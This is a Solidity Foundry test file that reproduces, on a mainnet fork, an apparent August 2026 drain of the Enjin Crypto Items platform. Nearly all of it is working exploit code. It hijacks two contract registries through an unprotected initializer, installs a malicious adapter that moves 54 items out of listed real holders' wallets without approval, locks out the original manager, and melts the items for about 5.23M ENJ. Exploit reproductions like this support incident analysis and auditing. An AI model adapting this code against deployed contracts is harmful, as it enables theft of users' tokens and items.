// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Enjin "Crypto Items" (ERC-1155, ENJ-backed) platform drain, Ethereum, Aug 26 2026.
// ~5.23M ENJ (~$142K) melted out of the item reserve in a single tx.
//
// Exploit tx : 0xd4a382da03c99ce3084661b913b50b525a4b283f66f510bcf1040152830b2a7e (block 25834071)
// Attacker   : 0x5ec1ba7892d11059c39557b762a97dd695778ca5 (EOA)
// Attack ctrt: 0x7083DdecE38216C7741fa76c75326Bea744ED321 (became registry manager)
// Platform   : 0xfaaFDc07907ff5120a76b34b731b278c38d6043C (ERC-1155 item platform)
// Reserve    : 0x4E643a25a64952895f553f20252861258727174e (holds ENJ backing + item state)
// ENJ        : 0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c
// Registry A : 0x13fA4b9a6C2F2604C919f96F456e3b50E968b157 (serves one set of item adapters)
// Registry B : 0x268C039A3127D3107c014F0DC6c390A53e6dB27f (serves the other set)
// Orig mgr   : 0x1952e45D5bD519DC679Cc459C5fD0Ba46305880c
//
// Root cause (verified independently against the on-chain trace, NOT a key/signer compromise):
// Every Enjin item is fronted by a per-item ERC-1155 adapter clone. A clone has no logic of its
// own: for any selector it looks up delegates(selector) on its "contract registry" and
// delegatecalls whatever implementation address is stored there. The two live registries expose
// an UNPROTECTED initialize(uint256) with no access control - any address can call it. The trace
// shows the attack contract calling registry.initialize(1) then registry.acceptManager(), after
// which ManagerUpdate fires from the original manager 0x1952e45D to the attack contract, i.e. the
// attacker becomes the registry manager purely by re-running the open initializer. As manager the
// attacker calls updateContract(impl, "stealNFT(address,address,uint256);", ...) and the
// transferFrom variant, registering their own code as the body those clones delegatecall into.
// The registered body moves item ownership through the platform's internal transfer functions
// with NO owner-approval check, so it pulls items out of arbitrary holders. Each stolen item is
// then melt()ed for its ENJ backing out of the reserve, and melt pays msg.sender.
//
// Reconstruction (real, not a replay): this test hijacks the two real registries with typed
// initialize()/acceptManager()/updateContract() calls, registers OUR OWN minimal adapter body
// (MaliciousAdapter below - the payload is legitimately our own code standing in for the
// attacker's, since the payload is not the vulnerability), then drives the real platform's own
// item-transfer and melt paths to pull the same 54 items from the same holders and melt them for
// their ENJ backing. No attacker creation/runtime bytecode is deployed.
//
// Two internal platform transfer entrypoints are used, exactly as the incident did:
//   0x41c1df0e(operator, from, to, id)          - moves one non-fungible instance (id low128 != 0)
//   0xf95d7da3(operator, from, to, id, value)   - moves value units of a fungible (id low128 == 0)
// The item list and per-item amounts are the ones recovered from the transaction's TransferSingle
// events; melt values are read live from the reserve on the fork, so the recovered ENJ equals the
// real drain (5,231,353 ENJ). No transient storage is touched, so the default evm_version is used.
//
// forge test --contracts src/test/2026-08/EnjinCryptoItems_exp.sol -vvv

interface IReserveRegistry {
    function initialize(
        uint256 version
    ) external;
    function acceptManager() external;
    function updateContract(address implementation, string calldata functions, string calldata commitMessage)
        external;
}

interface IPlatform {
    function getAdapter(
        uint256 id
    ) external view returns (address);
    function melt(uint256[] calldata ids, uint256[] calldata values) external;
    function balanceOf(address owner, uint256 id) external view returns (uint256);
}

interface IMalicious {
    function pwnNF(address from, address to, uint256 id) external;
    function pwnFT(address from, address to, uint256 id, uint256 value) external;
}

// Our own payload, registered as the item-adapter clones' function body. It runs via delegatecall
// from a clone, so msg.sender to the platform is the clone itself, which the platform accepts as
// the registered adapter for the item. There is deliberately no owner/approval check - that is the
// whole point of what the compromised registry lets an attacker install.
contract MaliciousAdapter {
    address constant PLATFORM = 0xfaaFDc07907ff5120a76b34b731b278c38d6043C;

    function pwnNF(address from, address to, uint256 id) external {
        (bool ok,) = PLATFORM.call(abi.encodeWithSelector(0x41c1df0e, to, from, to, id));
        require(ok, "nf move failed");
    }

    function pwnFT(address from, address to, uint256 id, uint256 value) external {
        (bool ok,) = PLATFORM.call(abi.encodeWithSelector(0xf95d7da3, to, from, to, id, value));
        require(ok, "ft move failed");
    }
}

// Re-initializing a registry clears the delegate for initialize(uint256), so the next item-adapter
// clone creation (which calls the clone's initialize) would revert. The incident registered a
// no-op initialize to get past that; we register the same. acceptManager() is registered too,
// mirroring the on-chain "lock" step that fenced the original manager out.
contract NoopStub {
    function initialize(
        uint256
    ) external {}
    function acceptManager() external {}
}

contract EnjinCryptoItemsAttack {
    IPlatform constant PLATFORM = IPlatform(0xfaaFDc07907ff5120a76b34b731b278c38d6043C);
    address constant ENJ = 0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c;
    IReserveRegistry constant REG_A = IReserveRegistry(0x13fA4b9a6C2F2604C919f96F456e3b50E968b157);
    IReserveRegistry constant REG_B = IReserveRegistry(0x268C039A3127D3107c014F0DC6c390A53e6dB27f);
    uint256 constant INSTANCE_MASK = (uint256(1) << 128) - 1; // low 128 bits: NF index; 0 => fungible

    address[] holders;
    uint256[] ids;
    uint256[] amts;

    function _add(address h, uint256 id, uint256 a) internal {
        holders.push(h);
        ids.push(id);
        amts.push(a);
    }

    constructor() {
        _add(0x50bF217523dC390B18f31bdb1099eBF937dA1756, 0x7880000000000a2f000000000000000000000000000000000000000000000001, 1);
        _add(0xDe45Af30cc3a591824e3a2F6ccd74745F7E75c14, 0x088000000000000b000000000000000000000000000000000000000000000002, 1);
        _add(0xDe45Af30cc3a591824e3a2F6ccd74745F7E75c14, 0x088000000000000b000000000000000000000000000000000000000000000003, 1);
        _add(0x73250bBEdb86fD26a5c079353B88bD8f202ee8c7, 0x088000000000000b000000000000000000000000000000000000000000000004, 1);
        _add(0x3bd429D09D2845812DD57c5b514D3cCD7c6Ba7FB, 0x088000000000000b00000000000000000000000000000000000000000000000b, 1);
        _add(0x3bd429D09D2845812DD57c5b514D3cCD7c6Ba7FB, 0x088000000000000b00000000000000000000000000000000000000000000000c, 1);
        _add(0xA1ecB46C0bE223DFf23EfdA8bd553d17b938Af47, 0x088000000000000b00000000000000000000000000000000000000000000000d, 1);
        _add(0xA1ecB46C0bE223DFf23EfdA8bd553d17b938Af47, 0x088000000000000b00000000000000000000000000000000000000000000000e, 1);
        _add(0x67DCf9536F0fEa888bbe3Ed87e2B9FAEdBF6b876, 0x7000000000000002000000000000000000000000000000000000000000000000, 1);
        _add(0x67DCf9536F0fEa888bbe3Ed87e2B9FAEdBF6b876, 0x7000000000000003000000000000000000000000000000000000000000000000, 1);
        _add(0x65FFe5a603B9dAC9Bca330bf387979701374C96C, 0x7800000000000010000000000000000000000000000000000000000000000000, 1995);
        _add(0x4dCB0b4e2E66dBdEEB21946F7f210e3E332d8e7a, 0x7800000000000010000000000000000000000000000000000000000000000000, 1);
        _add(0x1121367c7E10318aaa163E974FBc1AE33B30eE97, 0x7800000000000010000000000000000000000000000000000000000000000000, 1);
        _add(0x91D9aaf2198dd83A21086f86c64627CcAa495C5a, 0x7000000000000105000000000000000000000000000000000000000000000000, 89);
        _add(0x10d8bEC072631D50282bAB213Dc9dA219A3797a7, 0x7000000000000105000000000000000000000000000000000000000000000000, 5);
        _add(0xA1ecB46C0bE223DFf23EfdA8bd553d17b938Af47, 0x7000000000000105000000000000000000000000000000000000000000000000, 4);
        _add(0x4dCB0b4e2E66dBdEEB21946F7f210e3E332d8e7a, 0x7000000000000105000000000000000000000000000000000000000000000000, 4);
        _add(0xE45bA52E62B67466977a9876Cb83cE1f57866891, 0x7000000000000105000000000000000000000000000000000000000000000000, 2);
        _add(0x1121367c7E10318aaa163E974FBc1AE33B30eE97, 0x7000000000000105000000000000000000000000000000000000000000000000, 2);
        _add(0x0eab735656c3D4Ed197Fa1df2Bfd854E970E07DB, 0x7000000000000105000000000000000000000000000000000000000000000000, 2);
        _add(0xfa5ae0e8216aCb476Bb3b36479C73B0f8412ecD4, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xecA72Efb6a78E971C1664d3251FE5D91c5561C29, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xEc2A3442fD8Ad20A8E269e6e782D2D56da6B35A4, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xe8e209Ca03650bE9EAD741C5BF4bdC7Bf9bdaAe1, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xE596eB841Cd9c67316846e80932Be4f240fDf2ED, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xe317f6320ea52cD3574a0D685F728de1B0Af735C, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xE229edE8A37003249fdDB6C02b24882fAaaCC5cf, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xdefD66d15908791378164b7bEc0b324E7bAde803, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xCbDAec8c090ECDca39228a2c80dcc90e0c26A528, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xcAf6A331b57F2a8B78C39E133a889216c6123ff3, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xC5E8cA63fb31145e8356Fd7Ba257B1A8e19BbA01, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xC35147d958BCdeCE5fC0430633879B49c0E341B9, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xbdE1Ff1f4915B14104F1149dEC0E0d6725A2649B, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xBb8BD758e2412b3513Da6c4900a41Fc0BDd826Fe, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xB67D6ac97Bea36d6372b23E7E7D3A466958321a7, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xaB567898C746Fa1D14fB239294AC806BdfE547Ac, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xA97872c3Bd1B060d7370378F50A2EaE2ff1003A8, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xa884fEb9Ba1d386b4A9273a0826b1E25016596aA, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0xa0F1aC6B4872b9Be77A1ceAEBD47A46773f9a140, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x98fed211a4062535274C17495b503e7136F653D0, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x98b2Bd42743F5bEA16fb3a5F670049D479E5F77d, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x982b862E80fFc2B0c6E6Fb4AEC6dC65114604F7C, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x94ed5f30C139eeD257EE30703872Fb28FAE468b6, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x70E737b4B472D80b2585163cC404EE2515d4234E, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x628d7Adf5d3071d4e03FB015b2c3EfD02e36123A, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x546B4482844376b0f0c9707D95aE74ec8a2b8670, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x4F085fc80c7339B6225a37F005e5578171b15842, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x48bA859448962F446D5f4f688912E42d924881a3, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x2dD1F12803f08861Da2DF8b82d9A78fAad19224B, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x2D7E2a293F64C920Fda4f75ea3529D90DD91B9EE, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x170B21e601456A6bCa2D54B9656fb548F75AbbF3, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x15661325e5886a9535d0A7619c8Aeb27A1ef66Fe, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x0b0C99cF1ba4448F474D0fFf1d94585e62dDA665, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
        _add(0x01394f9513b37a914a5AD31197b4cca035f6F93E, 0x7000000000000105000000000000000000000000000000000000000000000000, 1);
    }

    function attack() external returns (uint256) {
        MaliciousAdapter impl = new MaliciousAdapter();
        NoopStub stub = new NoopStub();

        // Hijack both registries and install our body as the clones' transfer logic.
        _hijack(REG_A, address(impl), address(stub));
        _hijack(REG_B, address(impl), address(stub));

        for (uint256 i = 0; i < ids.length; i++) {
            uint256 id = ids[i];
            uint256 base = (id >> 128) << 128;

            // Ensure the per-item adapter clone exists (create it through the platform's own
            // getOrCreate path if the item has never been wrapped).
            address clone = PLATFORM.getAdapter(base);
            if (clone == address(0)) {
                (bool ok,) = address(PLATFORM).call(abi.encodeWithSelector(bytes4(0x33d332ab), base, bytes("PWN"), uint256(0)));
                require(ok, "adapter create failed");
                clone = PLATFORM.getAdapter(base);
                require(clone != address(0), "no adapter");
            }

            // Pull the item to ourselves with no approval, via our installed body on the clone.
            if (id & INSTANCE_MASK == 0) {
                IMalicious(clone).pwnFT(holders[i], address(this), id, amts[i]);
            } else {
                IMalicious(clone).pwnNF(holders[i], address(this), id);
            }

            // Melt it for its ENJ backing (melt pays msg.sender == this contract).
            uint256[] memory oneId = new uint256[](1);
            uint256[] memory oneAmt = new uint256[](1);
            oneId[0] = id;
            oneAmt[0] = amts[i];
            PLATFORM.melt(oneId, oneAmt);
        }

        return IERC20(ENJ).balanceOf(address(this));
    }

    function _hijack(IReserveRegistry reg, address impl, address stub) internal {
        reg.initialize(1); // unprotected: grants us the pending-manager slot
        reg.acceptManager(); // become the registry manager
        reg.updateContract(impl, "pwnNF(address,address,uint256);", "x");
        reg.updateContract(impl, "pwnFT(address,address,uint256,uint256);", "x");
        reg.updateContract(stub, "initialize(uint256);", "lock");
        reg.updateContract(stub, "acceptManager();", "lock");
    }
}

contract EnjinCryptoItemsExp is BaseTestWithBalanceLog {
    address internal constant ENJ = 0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c;
    uint256 internal constant FORK_BLOCK = 25_834_070; // parent of the exploit block 25834071

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", FORK_BLOCK);
        fundingToken = ENJ;
        vm.label(0xfaaFDc07907ff5120a76b34b731b278c38d6043C, "Platform");
        vm.label(0x4E643a25a64952895f553f20252861258727174e, "Reserve");
        vm.label(0x13fA4b9a6C2F2604C919f96F456e3b50E968b157, "RegistryA");
        vm.label(0x268C039A3127D3107c014F0DC6c390A53e6dB27f, "RegistryB");
        vm.label(ENJ, "ENJ");
    }

    function testExploit() public balanceLog {
        EnjinCryptoItemsAttack exploit = new EnjinCryptoItemsAttack();
        attacker = address(exploit);

        uint256 recovered = exploit.attack();
        emit log_named_decimal_uint("ENJ recovered from melting", recovered, 18);

        // Real incident melted 5,231,353 ENJ (~$142K). Reconstructed drain must match.
        assertApproxEqAbs(recovered, 5_231_353e18, 1e18, "ENJ recovered off expected ~5.23M");
    }
}
